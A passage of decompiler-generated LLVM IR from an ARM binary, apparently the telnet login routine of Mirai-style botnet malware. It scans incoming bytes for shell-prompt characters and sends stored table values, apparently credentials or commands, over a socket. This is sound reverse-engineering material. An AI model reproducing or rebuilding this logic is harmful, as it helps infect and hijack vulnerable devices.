  store i1 %v2_10ea4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ea4 = icmp eq i8 %v3_10ea0, 62
  store i1 %v7_10ea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ea4, label %dec_label_pc_10f08, label %bb394

bb394:                                            ; preds = %dec_label_pc_10e9c
  %v3_10ea8 = icmp ugt i8 %v3_10ea0, 57
  store i1 %v3_10ea8, i1* %cpsr_c.global-to-local, align 1
  %v8_10ea8 = icmp eq i8 %v3_10ea0, 58
  store i1 %v8_10ea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10ea8, label %dec_label_pc_10f08, label %dec_label_pc_10eb0

dec_label_pc_10eb0:                               ; preds = %bb394
  %v2_10eb0 = icmp ugt i8 %v3_10ea0, 35
  store i1 %v2_10eb0, i1* %cpsr_c.global-to-local, align 1
  %v7_10eb0 = icmp eq i8 %v3_10ea0, 36
  store i1 %v7_10eb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10eb0, label %dec_label_pc_10f08, label %dec_label_pc_10eb8

dec_label_pc_10eb8:                               ; preds = %dec_label_pc_10eb0
  %v2_10eb8 = icmp ugt i8 %v3_10ea0, 34
  store i1 %v2_10eb8, i1* %cpsr_c.global-to-local, align 1
  %v7_10eb8 = icmp eq i8 %v3_10ea0, 35
  store i1 %v7_10eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10eb8, label %dec_label_pc_10f08, label %dec_label_pc_10ec0

dec_label_pc_10ec0:                               ; preds = %dec_label_pc_10eb8
  %v2_10ec0 = icmp ugt i8 %v3_10ea0, 36
  store i1 %v2_10ec0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ec0 = icmp eq i8 %v3_10ea0, 37
  store i1 %v7_10ec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ec0, label %dec_label_pc_10f08, label %dec_label_pc_10ef0.preheader

dec_label_pc_10ef0.preheader:                     ; preds = %dec_label_pc_10ec0
  %v3_10ec4 = add i32 %v0_10d44, 28
  %v2_10ec8 = add i32 %v3_10ec4, %v3_10e8c
  store i32 %v2_10ec8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10ef0

dec_label_pc_10ed4:                               ; preds = %bb395
  %v2_10ed4 = icmp ugt i8 %v3_10ef8, 35
  store i1 %v2_10ed4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ed4 = icmp eq i8 %v3_10ef8, 36
  store i1 %v7_10ed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ed4, label %dec_label_pc_10f08, label %dec_label_pc_10edc

dec_label_pc_10edc:                               ; preds = %dec_label_pc_10ed4
  %v2_10edc = icmp ugt i8 %v3_10ef8, 34
  store i1 %v2_10edc, i1* %cpsr_c.global-to-local, align 1
  %v7_10edc = icmp eq i8 %v3_10ef8, 35
  store i1 %v7_10edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10edc, label %dec_label_pc_10f08, label %dec_label_pc_10ee4

dec_label_pc_10ee4:                               ; preds = %dec_label_pc_10edc
  %v2_10ee4 = icmp ugt i8 %v3_10ef8, 36
  store i1 %v2_10ee4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ee4 = icmp eq i8 %v3_10ef8, 37
  store i1 %v7_10ee4, i1* %cpsr_z.global-to-local, align 1
  %v1_10ee8 = add i32 %v0_10ee8, -1
  store i32 %v1_10ee8, i32* %r3.global-to-local, align 4
  br i1 %v7_10ee4, label %dec_label_pc_10f08, label %dec_label_pc_10ef0

dec_label_pc_10ef0:                               ; preds = %dec_label_pc_10ef0.preheader, %dec_label_pc_10ee4
  %v0_10ee8 = phi i32 [ %v2_10ec8, %dec_label_pc_10ef0.preheader ], [ %v1_10ee8, %dec_label_pc_10ee4 ]
  %v0_10ef0 = phi i32 [ %v1_10e90, %dec_label_pc_10ef0.preheader ], [ %v1_10ef0, %dec_label_pc_10ee4 ]
  %v1_10ef0 = add i32 %v0_10ef0, -1
  store i32 %v1_10ef0, i32* %r1.global-to-local, align 4
  %v2_10ef0 = icmp ne i32 %v0_10ef0, 0
  store i1 %v2_10ef0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ef0 = icmp eq i32 %v0_10ef0, 1
  store i1 %v7_10ef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ef0, label %dec_label_pc_10cc8.backedge.thread528, label %dec_label_pc_10ef8

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10ef0
  %v1_10ef8 = add i32 %v0_10ee8, -2
  %v2_10ef8 = inttoptr i32 %v1_10ef8 to i8*
  %v3_10ef8 = load i8, i8* %v2_10ef8, align 1
  %v4_10ef8 = zext i8 %v3_10ef8 to i32
  store i32 %v4_10ef8, i32* %r2.global-to-local, align 4
  %v2_10efc = icmp ugt i8 %v3_10ef8, 61
  store i1 %v2_10efc, i1* %cpsr_c.global-to-local, align 1
  %v7_10efc = icmp eq i8 %v3_10ef8, 62
  store i1 %v7_10efc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10efc, label %dec_label_pc_10f08, label %bb395

bb395:                                            ; preds = %dec_label_pc_10ef8
  %v3_10f00 = icmp ugt i8 %v3_10ef8, 57
  store i1 %v3_10f00, i1* %cpsr_c.global-to-local, align 1
  %v8_10f00 = icmp eq i8 %v3_10ef8, 58
  store i1 %v8_10f00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f00, label %dec_label_pc_10f08, label %dec_label_pc_10ed4

dec_label_pc_10f08:                               ; preds = %dec_label_pc_10ef8, %bb395, %dec_label_pc_10ee4, %dec_label_pc_10edc, %dec_label_pc_10ed4, %dec_label_pc_10ec0, %dec_label_pc_10e9c, %dec_label_pc_10eb8, %dec_label_pc_10eb0, %bb394
  %v0_10f0c = phi i32 [ %v1_10e90, %dec_label_pc_10ec0 ], [ %v1_10e90, %dec_label_pc_10e9c ], [ %v1_10e90, %dec_label_pc_10eb8 ], [ %v1_10e90, %dec_label_pc_10eb0 ], [ %v1_10e90, %bb394 ], [ %v1_10ef0, %dec_label_pc_10ed4 ], [ %v1_10ef0, %dec_label_pc_10edc ], [ %v1_10ef0, %dec_label_pc_10ee4 ], [ %v1_10ef0, %bb395 ], [ %v1_10ef0, %dec_label_pc_10ef8 ]
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_10f0c = add i32 %v0_10f0c, 1
  store i32 %v1_10f0c, i32* @r7, align 4
  %v1_10f10 = call i32 @table_unlock_val(i32 28)
  store i32 %v2_11340, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v3_10f20 = call i32 @table_retrieve_val(i32 28, i32* nonnull %stack_var_-60)
  store i32 %v3_10f20, i32* %r0.global-to-local, align 4
  %v3_10f24 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10f24, i32* %r2.global-to-local, align 4
  store i32 %v3_10f20, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10f30 = load i32, i32* @r5, align 4
  %v1_10f30 = add i32 %v0_10f30, 4
  %v2_10f30 = inttoptr i32 %v1_10f30 to i32*
  %v3_10f30 = load i32, i32* %v2_10f30, align 4
  store i32 %v3_10f30, i32* %r0.global-to-local, align 4
  %v4_10f34 = call i32 @__libc_send(i32 %v3_10f30, i32 %v3_10f20, i32 %v3_10f24, i32 16384)
  store i32 %v4_10f34, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10f44 = load i32, i32* @r5, align 4
  %v1_10f44 = add i32 %v0_10f44, 4
  %v2_10f44 = inttoptr i32 %v1_10f44 to i32*
  %v3_10f44 = load i32, i32* %v2_10f44, align 4
  store i32 %v3_10f44, i32* %r0.global-to-local, align 4
  %v4_10f48 = call i32 @__libc_send(i32 %v3_10f44, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2, i32 16384)
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_10f50 = call i32 @table_lock_val(i32 28)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_10f58 = load i32, i32* @r5, align 4
  %v2_10f58 = add i32 %v1_10f58, 12
  %v3_10f58 = inttoptr i32 %v2_10f58 to i32*
  store i32 10, i32* %v3_10f58, align 4
  br label %dec_label_pc_10e64

dec_label_pc_10f60:                               ; preds = %dec_label_pc_10d44
  %v1_10f60 = add i32 %v0_10d44, 24
  %v2_10f60 = inttoptr i32 %v1_10f60 to i32*
  %v3_10f60 = load i32, i32* %v2_10f60, align 4
  store i32 %v3_10f60, i32* %r2.global-to-local, align 4
  %v1_10f64 = add i32 %v3_10f60, -1
  store i32 %v1_10f64, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10f68 = icmp eq i32 %v1_10f64, 0
  store i1 %v2_10f68, i1* %cpsr_z.global-to-local, align 1
  %tmp396 = icmp slt i32 %v1_10f64, 1
  br i1 %tmp396, label %dec_label_pc_10cc8.backedge.thread, label %dec_label_pc_10f70

dec_label_pc_10f70:                               ; preds = %dec_label_pc_10f60
  %v2_10f70 = add i32 %v1_10f64, %v0_10d44
  store i32 %v2_10f70, i32* %r3.global-to-local, align 4
  %v1_10f74 = add i32 %v2_10f70, 28
  %v2_10f74 = inttoptr i32 %v1_10f74 to i8*
  %v3_10f74 = load i8, i8* %v2_10f74, align 1
  %v4_10f74 = zext i8 %v3_10f74 to i32
  store i32 %v4_10f74, i32* %r3.global-to-local, align 4
  %v2_10f78 = icmp ugt i8 %v3_10f74, 61
  store i1 %v2_10f78, i1* %cpsr_c.global-to-local, align 1
  %v7_10f78 = icmp eq i8 %v3_10f74, 62
  store i1 %v7_10f78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f78, label %dec_label_pc_10fdc, label %bb397

bb397:                                            ; preds = %dec_label_pc_10f70
  %v3_10f7c = icmp ugt i8 %v3_10f74, 57
  store i1 %v3_10f7c, i1* %cpsr_c.global-to-local, align 1
  %v8_10f7c = icmp eq i8 %v3_10f74, 58
  store i1 %v8_10f7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f7c, label %dec_label_pc_10fdc, label %dec_label_pc_10f84

dec_label_pc_10f84:                               ; preds = %bb397
  %v2_10f84 = icmp ugt i8 %v3_10f74, 35
  store i1 %v2_10f84, i1* %cpsr_c.global-to-local, align 1
  %v7_10f84 = icmp eq i8 %v3_10f74, 36
  store i1 %v7_10f84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f84, label %dec_label_pc_10fdc, label %dec_label_pc_10f8c

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_10f84
  %v2_10f8c = icmp ugt i8 %v3_10f74, 34
  store i1 %v2_10f8c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f8c = icmp eq i8 %v3_10f74, 35
  store i1 %v7_10f8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f8c, label %dec_label_pc_10fdc, label %dec_label_pc_10f94

dec_label_pc_10f94:                               ; preds = %dec_label_pc_10f8c
  %v2_10f94 = icmp ugt i8 %v3_10f74, 36
  store i1 %v2_10f94, i1* %cpsr_c.global-to-local, align 1
  %v7_10f94 = icmp eq i8 %v3_10f74, 37
  store i1 %v7_10f94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f94, label %dec_label_pc_10fdc, label %dec_label_pc_10fc4.preheader

dec_label_pc_10fc4.preheader:                     ; preds = %dec_label_pc_10f94
  %v3_10f98 = add i32 %v0_10d44, 28
  %v2_10f9c = add i32 %v3_10f98, %v3_10f60
  store i32 %v2_10f9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10fc4

dec_label_pc_10fa8:                               ; preds = %bb398
  %v2_10fa8 = icmp ugt i8 %v3_10fcc, 35
  store i1 %v2_10fa8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fa8 = icmp eq i8 %v3_10fcc, 36
  store i1 %v7_10fa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fa8, label %dec_label_pc_10fdc, label %dec_label_pc_10fb0

dec_label_pc_10fb0:                               ; preds = %dec_label_pc_10fa8
  %v2_10fb0 = icmp ugt i8 %v3_10fcc, 34
  store i1 %v2_10fb0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fb0 = icmp eq i8 %v3_10fcc, 35
  store i1 %v7_10fb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fb0, label %dec_label_pc_10fdc, label %dec_label_pc_10fb8

dec_label_pc_10fb8:                               ; preds = %dec_label_pc_10fb0
  %v2_10fb8 = icmp ugt i8 %v3_10fcc, 36
  store i1 %v2_10fb8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fb8 = icmp eq i8 %v3_10fcc, 37
  store i1 %v7_10fb8, i1* %cpsr_z.global-to-local, align 1
  %v1_10fbc = add i32 %v0_10fbc, -1
  store i32 %v1_10fbc, i32* %r3.global-to-local, align 4
  br i1 %v7_10fb8, label %dec_label_pc_10fdc, label %dec_label_pc_10fc4

dec_label_pc_10fc4:                               ; preds = %dec_label_pc_10fc4.preheader, %dec_label_pc_10fb8
  %v0_10fbc = phi i32 [ %v2_10f9c, %dec_label_pc_10fc4.preheader ], [ %v1_10fbc, %dec_label_pc_10fb8 ]
  %v0_10fc4 = phi i32 [ %v1_10f64, %dec_label_pc_10fc4.preheader ], [ %v1_10fc4, %dec_label_pc_10fb8 ]
  %v1_10fc4 = add i32 %v0_10fc4, -1
  store i32 %v1_10fc4, i32* %r1.global-to-local, align 4
  %v2_10fc4 = icmp ne i32 %v0_10fc4, 0
  store i1 %v2_10fc4, i1* %cpsr_c.global-to-local, align 1
  %v7_10fc4 = icmp eq i32 %v0_10fc4, 1
  store i1 %v7_10fc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fc4, label %dec_label_pc_10cc8.backedge.thread528, label %dec_label_pc_10fcc

dec_label_pc_10fcc:                               ; preds = %dec_label_pc_10fc4
  %v1_10fcc = add i32 %v0_10fbc, -2
  %v2_10fcc = inttoptr i32 %v1_10fcc to i8*
  %v3_10fcc = load i8, i8* %v2_10fcc, align 1
  %v4_10fcc = zext i8 %v3_10fcc to i32
  store i32 %v4_10fcc, i32* %r2.global-to-local, align 4
  %v2_10fd0 = icmp ugt i8 %v3_10fcc, 61
  store i1 %v2_10fd0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fd0 = icmp eq i8 %v3_10fcc, 62
  store i1 %v7_10fd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fd0, label %dec_label_pc_10fdc, label %bb398

bb398:                                            ; preds = %dec_label_pc_10fcc
  %v3_10fd4 = icmp ugt i8 %v3_10fcc, 57
  store i1 %v3_10fd4, i1* %cpsr_c.global-to-local, align 1
  %v8_10fd4 = icmp eq i8 %v3_10fcc, 58
  store i1 %v8_10fd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10fd4, label %dec_label_pc_10fdc, label %dec_label_pc_10fa8

dec_label_pc_10fdc:                               ; preds = %dec_label_pc_10fcc, %bb398, %dec_label_pc_10fb8, %dec_label_pc_10fb0, %dec_label_pc_10fa8, %dec_label_pc_10f94, %dec_label_pc_10f70, %dec_label_pc_10f8c, %dec_label_pc_10f84, %bb397
  %v0_10fe0 = phi i32 [ %v1_10f64, %dec_label_pc_10f94 ], [ %v1_10f64, %dec_label_pc_10f70 ], [ %v1_10f64, %dec_label_pc_10f8c ], [ %v1_10f64, %dec_label_pc_10f84 ], [ %v1_10f64, %bb397 ], [ %v1_10fc4, %dec_label_pc_10fa8 ], [ %v1_10fc4, %dec_label_pc_10fb0 ], [ %v1_10fc4, %dec_label_pc_10fb8 ], [ %v1_10fc4, %bb398 ], [ %v1_10fc4, %dec_label_pc_10fcc ]
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_10fe0 = add i32 %v0_10fe0, 1
  store i32 %v1_10fe0, i32* @r7, align 4
  %v1_10fe4 = call i32 @table_unlock_val(i32 24)
  store i32 %v2_11340, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_10ff4 = call i32 @table_retrieve_val(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v3_10ff4, i32* %r0.global-to-local, align 4
  %v3_10ff8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10ff8, i32* %r2.global-to-local, align 4
  store i32 %v3_10ff4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11004 = load i32, i32* @r5, align 4
  %v1_11004 = add i32 %v0_11004, 4
  %v2_11004 = inttoptr i32 %v1_11004 to i32*
  %v3_11004 = load i32, i32* %v2_11004, align 4
  store i32 %v3_11004, i32* %r0.global-to-local, align 4
  %v4_11008 = call i32 @__libc_send(i32 %v3_11004, i32 %v3_10ff4, i32 %v3_10ff8, i32 16384)
  store i32 %v4_11008, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11018 = load i32, i32* @r5, align 4
  %v1_11018 = add i32 %v0_11018, 4
  %v2_11018 = inttoptr i32 %v1_11018 to i32*
  %v3_11018 = load i32, i32* %v2_11018, align 4
  store i32 %v3_11018, i32* %r0.global-to-local, align 4
  %v4_1101c = call i32 @__libc_send(i32 %v3_11018, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_11024 = call i32 @table_lock_val(i32 24)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1102c = load i32, i32* @r5, align 4
  %v2_1102c = add i32 %v1_1102c, 12
  %v3_1102c = inttoptr i32 %v2_1102c to i32*
  store i32 8, i32* %v3_1102c, align 4
  br label %dec_label_pc_10e64

dec_label_pc_11034:                               ; preds = %dec_label_pc_10d44
  %v1_11034 = add i32 %v0_10d44, 24
  %v2_11034 = inttoptr i32 %v1_11034 to i32*
  %v3_11034 = load i32, i32* %v2_11034, align 4
  store i32 %v3_11034, i32* %r2.global-to-local, align 4
  %v1_11038 = add i32 %v3_11034, -1
  store i32 %v1_11038, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1103c = icmp eq i32 %v1_11038, 0
  store i1 %v2_1103c, i1* %cpsr_z.global-to-local, align 1
  %tmp399 = icmp slt i32 %v1_11038, 1
  br i1 %tmp399, label %dec_label_pc_10cc8.backedge.thread, label %dec_label_pc_11044

dec_label_pc_11044:                               ; preds = %dec_label_pc_11034
  %v2_11044 = add i32 %v1_11038, %v0_10d44
  store i32 %v2_11044, i32* %r3.global-to-local, align 4
  %v1_11048 = add i32 %v2_11044, 28
  %v2_11048 = inttoptr i32 %v1_11048 to i8*
  %v3_11048 = load i8, i8* %v2_11048, align 1
  %v4_11048 = zext i8 %v3_11048 to i32
  store i32 %v4_11048, i32* %r3.global-to-local, align 4
  %v2_1104c = icmp ugt i8 %v3_11048, 61
  store i1 %v2_1104c, i1* %cpsr_c.global-to-local, align 1
  %v7_1104c = icmp eq i8 %v3_11048, 62
  store i1 %v7_1104c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1104c, label %dec_label_pc_110b0, label %bb400

bb400:                                            ; preds = %dec_label_pc_11044
  %v3_11050 = icmp ugt i8 %v3_11048, 57
  store i1 %v3_11050, i1* %cpsr_c.global-to-local, align 1
  %v8_11050 = icmp eq i8 %v3_11048, 58
  store i1 %v8_11050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11050, label %dec_label_pc_110b0, label %dec_label_pc_11058

dec_label_pc_11058:                               ; preds = %bb400
  %v2_11058 = icmp ugt i8 %v3_11048, 35
  store i1 %v2_11058, i1* %cpsr_c.global-to-local, align 1
  %v7_11058 = icmp eq i8 %v3_11048, 36
  store i1 %v7_11058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11058, label %dec_label_pc_110b0, label %dec_label_pc_11060

dec_label_pc_11060:                               ; preds = %dec_label_pc_11058
  %v2_11060 = icmp ugt i8 %v3_11048, 34
  store i1 %v2_11060, i1* %cpsr_c.global-to-local, align 1
  %v7_11060 = icmp eq i8 %v3_11048, 35
  store i1 %v7_11060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11060, label %dec_label_pc_110b0, label %dec_label_pc_11068

dec_label_pc_11068:                               ; preds = %dec_label_pc_11060
  %v2_11068 = icmp ugt i8 %v3_11048, 36
  store i1 %v2_11068, i1* %cpsr_c.global-to-local, align 1
  %v7_11068 = icmp eq i8 %v3_11048, 37
  store i1 %v7_11068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11068, label %dec_label_pc_110b0, label %dec_label_pc_11098.preheader

dec_label_pc_11098.preheader:                     ; preds = %dec_label_pc_11068
  %v3_1106c = add i32 %v0_10d44, 28
  %v2_11070 = add i32 %v3_1106c, %v3_11034
  store i32 %v2_11070, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11098

dec_label_pc_1107c:                               ; preds = %bb401
  %v2_1107c = icmp ugt i8 %v3_110a0, 35
  store i1 %v2_1107c, i1* %cpsr_c.global-to-local, align 1
  %v7_1107c = icmp eq i8 %v3_110a0, 36
  store i1 %v7_1107c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1107c, label %dec_label_pc_110b0, label %dec_label_pc_11084

dec_label_pc_11084:                               ; preds = %dec_label_pc_1107c
  %v2_11084 = icmp ugt i8 %v3_110a0, 34
  store i1 %v2_11084, i1* %cpsr_c.global-to-local, align 1
  %v7_11084 = icmp eq i8 %v3_110a0, 35
  store i1 %v7_11084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11084, label %dec_label_pc_110b0, label %dec_label_pc_1108c

dec_label_pc_1108c:                               ; preds = %dec_label_pc_11084
  %v2_1108c = icmp ugt i8 %v3_110a0, 36
  store i1 %v2_1108c, i1* %cpsr_c.global-to-local, align 1
  %v7_1108c = icmp eq i8 %v3_110a0, 37
  store i1 %v7_1108c, i1* %cpsr_z.global-to-local, align 1
  %v1_11090 = add i32 %v0_11090, -1
  store i32 %v1_11090, i32* %r3.global-to-local, align 4
  br i1 %v7_1108c, label %dec_label_pc_110b0, label %dec_label_pc_11098

dec_label_pc_11098:                               ; preds = %dec_label_pc_11098.preheader, %dec_label_pc_1108c
  %v0_11090 = phi i32 [ %v2_11070, %dec_label_pc_11098.preheader ], [ %v1_11090, %dec_label_pc_1108c ]
  %v0_11098 = phi i32 [ %v1_11038, %dec_label_pc_11098.preheader ], [ %v1_11098, %dec_label_pc_1108c ]
  %v1_11098 = add i32 %v0_11098, -1
  store i32 %v1_11098, i32* %r1.global-to-local, align 4
  %v2_11098 = icmp ne i32 %v0_11098, 0
  store i1 %v2_11098, i1* %cpsr_c.global-to-local, align 1
  %v7_11098 = icmp eq i32 %v0_11098, 1
  store i1 %v7_11098, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11098, label %dec_label_pc_10cc8.backedge.thread528, label %dec_label_pc_110a0

dec_label_pc_110a0:                               ; preds = %dec_label_pc_11098
  %v1_110a0 = add i32 %v0_11090, -2
  %v2_110a0 = inttoptr i32 %v1_110a0 to i8*
  %v3_110a0 = load i8, i8* %v2_110a0, align 1
  %v4_110a0 = zext i8 %v3_110a0 to i32
  store i32 %v4_110a0, i32* %r2.global-to-local, align 4
  %v2_110a4 = icmp ugt i8 %v3_110a0, 61
  store i1 %v2_110a4, i1* %cpsr_c.global-to-local, align 1
  %v7_110a4 = icmp eq i8 %v3_110a0, 62
  store i1 %v7_110a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110a4, label %dec_label_pc_110b0, label %bb401

bb401:                                            ; preds = %dec_label_pc_110a0
  %v3_110a8 = icmp ugt i8 %v3_110a0, 57
  store i1 %v3_110a8, i1* %cpsr_c.global-to-local, align 1
  %v8_110a8 = icmp eq i8 %v3_110a0, 58
  store i1 %v8_110a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_110a8, label %dec_label_pc_110b0, label %dec_label_pc_1107c

dec_label_pc_110b0:                               ; preds = %dec_label_pc_110a0, %bb401, %dec_label_pc_1108c, %dec_label_pc_11084, %dec_label_pc_1107c, %dec_label_pc_11068, %dec_label_pc_11044, %dec_label_pc_11060, %dec_label_pc_11058, %bb400
  %v0_110b4 = phi i32 [ %v1_11038, %dec_label_pc_11068 ], [ %v1_11038, %dec_label_pc_11044 ], [ %v1_11038, %dec_label_pc_11060 ], [ %v1_11038, %dec_label_pc_11058 ], [ %v1_11038, %bb400 ], [ %v1_11098, %dec_label_pc_1107c ], [ %v1_11098, %dec_label_pc_11084 ], [ %v1_11098, %dec_label_pc_1108c ], [ %v1_11098, %bb401 ], [ %v1_11098, %dec_label_pc_110a0 ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_110b4 = add i32 %v0_110b4, 1
  store i32 %v1_110b4, i32* @r7, align 4
  %v1_110b8 = call i32 @table_unlock_val(i32 26)
  store i32 %v2_11340, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_110c8 = call i32 @table_retrieve_val(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_110c8, i32* %r0.global-to-local, align 4
  %v3_110cc = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_110cc, i32* %r2.global-to-local, align 4
  store i32 %v3_110c8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_110d8 = load i32, i32* @r5, align 4
  %v1_110d8 = add i32 %v0_110d8, 4
  %v2_110d8 = inttoptr i32 %v1_110d8 to i32*
  %v3_110d8 = load i32, i32* %v2_110d8, align 4
  store i32 %v3_110d8, i32* %r0.global-to-local, align 4
  %v4_110dc = call i32 @__libc_send(i32 %v3_110d8, i32 %v3_110c8, i32 %v3_110cc, i32 16384)
  store i32 %v4_110dc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_110ec = load i32, i32* @r5, align 4
  %v1_110ec = add i32 %v0_110ec, 4
  %v2_110ec = inttoptr i32 %v1_110ec to i32*
  %v3_110ec = load i32, i32* %v2_110ec, align 4
  store i32 %v3_110ec, i32* %r0.global-to-local, align 4
  %v4_110f0 = call i32 @__libc_send(i32 %v3_110ec, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2, i32 16384)
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_110f8 = call i32 @table_lock_val(i32 26)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_11100 = load i32, i32* @r5, align 4
  %v2_11100 = add i32 %v1_11100, 12
  %v3_11100 = inttoptr i32 %v2_11100 to i32*
  store i32 7, i32* %v3_11100, align 4
  br label %dec_label_pc_10e64

dec_label_pc_11108:                               ; preds = %dec_label_pc_10d44
  %v1_11108 = add i32 %v0_10d44, 24
  %v2_11108 = inttoptr i32 %v1_11108 to i32*
  %v3_11108 = load i32, i32* %v2_11108, align 4
  store i32 %v3_11108, i32* %r2.global-to-local, align 4
  %v1_1110c = add i32 %v3_11108, -1
  store i32 %v1_1110c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11110 = icmp eq i32 %v1_1110c, 0
  store i1 %v2_11110, i1* %cpsr_z.global-to-local, align 1
  %tmp402 = icmp slt i32 %v1_1110c, 1
  br i1 %tmp402, label %dec_label_pc_10cc8.backedge.thread, label %dec_label_pc_11118

dec_label_pc_11118:                               ; preds = %dec_label_pc_11108
  %v2_11118 = add i32 %v1_1110c, %v0_10d44
  store i32 %v2_11118, i32* %r3.global-to-local, align 4
  %v1_1111c = add i32 %v2_11118, 28
  %v2_1111c = inttoptr i32 %v1_1111c to i8*
  %v3_1111c = load i8, i8* %v2_1111c, align 1
  %v4_1111c = zext i8 %v3_1111c to i32
  store i32 %v4_1111c, i32* %r3.global-to-local, align 4
  %v2_11120 = icmp ugt i8 %v3_1111c, 61
  store i1 %v2_11120, i1* %cpsr_c.global-to-local, align 1
  %v7_11120 = icmp eq i8 %v3_1111c, 62
  store i1 %v7_11120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11120, label %dec_label_pc_11184, label %bb403

bb403:                                            ; preds = %dec_label_pc_11118
  %v3_11124 = icmp ugt i8 %v3_1111c, 57
  store i1 %v3_11124, i1* %cpsr_c.global-to-local, align 1
  %v8_11124 = icmp eq i8 %v3_1111c, 58
  store i1 %v8_11124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11124, label %dec_label_pc_11184, label %dec_label_pc_1112c

dec_label_pc_1112c:                               ; preds = %bb403
  %v2_1112c = icmp ugt i8 %v3_1111c, 35
  store i1 %v2_1112c, i1* %cpsr_c.global-to-local, align 1
  %v7_1112c = icmp eq i8 %v3_1111c, 36
  store i1 %v7_1112c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1112c, label %dec_label_pc_11184, label %dec_label_pc_11134

dec_label_pc_11134:                               ; preds = %dec_label_pc_1112c
  %v2_11134 = icmp ugt i8 %v3_1111c, 34
  store i1 %v2_11134, i1* %cpsr_c.global-to-local, align 1
  %v7_11134 = icmp eq i8 %v3_1111c, 35
  store i1 %v7_11134, i1* %cpsr_z.global-to-local, align 1
